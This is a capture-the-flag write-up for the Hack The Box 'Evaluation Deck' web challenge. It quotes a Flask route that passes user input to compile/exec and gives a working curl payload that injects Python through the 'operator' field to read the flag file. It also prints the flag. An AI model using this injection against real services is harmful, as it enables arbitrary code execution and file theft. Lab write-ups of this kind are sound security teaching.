
202210251336
Status:: #ctf
Tags: [[hack_the_boo]]

# Hack_the_boo_evaluation_deck
Platform: *hackthebox*
event: *hack the boo*
type: *web*
task: *A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?*
flag: **HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}**

# steps

### File tree of challenge:
```
.
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── card.css
│   │   │   │   ├── game.css
│   │   │   │   └── index.css
│   │   │   ├── images
│   │   │   │   ├── alive.gif
│   │   │   │   ├── bottom-circle.png
│   │   │   │   ├── card10.png
│   │   │   │   ├── card11.png
│   │   │   │   ├── card12.png
│   │   │   │   ├── card13.png
│   │   │   │   ├── card14.png
│   │   │   │   ├── card15.png
│   │   │   │   ├── card16.png
│   │   │   │   ├── card17.png
│   │   │   │   ├── card18.png
│   │   │   │   ├── card19.png
│   │   │   │   ├── card1.png
│   │   │   │   ├── card20.png
│   │   │   │   ├── card2.png
│   │   │   │   ├── card3.png
│   │   │   │   ├── card4.png
│   │   │   │   ├── card5.png
│   │   │   │   ├── card6.png
│   │   │   │   ├── card7.png
│   │   │   │   ├── card8.png
│   │   │   │   ├── card9.png
│   │   │   │   ├── card_back.png
│   │   │   │   └── dead.gif
│   │   │   └── js
│   │   │       ├── card.js
│   │   │       ├── jquery-migrate-1.2.1.js
│   │   │       ├── jquery.min.js
│   │   │       └── ui.js
│   │   ├── templates
│   │   │   └── index.html
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt
```
### endpoints:
- `/`
- `/api/get_health`

### Game logic 
Dealing damage to ghost is done by sending json data in `POST` request to `/api/get_health`.
```
curl -X POST  142.93.39.188:32614/api/get_health -H 'Content-Type: application/json' -d '{"current_health":"100","attack_power":"32","operator":"+"}'
{"message":132}
```

Method called on this request:

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

Using browser inspector we can see what json body looks like:
```json
{"current_health":"100","attack_power":"32","operator":"+"}
```

### Exploiting
This method call's function `compile`.
Where `operator` variable is passed unchanged, hence we just have to send python file read code as `operator` string:
```python
"\nresult = open(\"../flag.txt\","r\").readline()\nr="
```
Here new line symbol `\n` is used to make our file  reading a separate operation.

Request to get file is:
```bash
curl -X POST  142.93.39.188:32614/api/get_health -H 'Content-Type: application/json' -d '{"current_health":"1","attack_power":"32","operator":"\nresult = open(\"../flag.txt\", \"r\").readline()\nr="}'
```
Response with flag:
```bash
{"message":"HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}"}
```
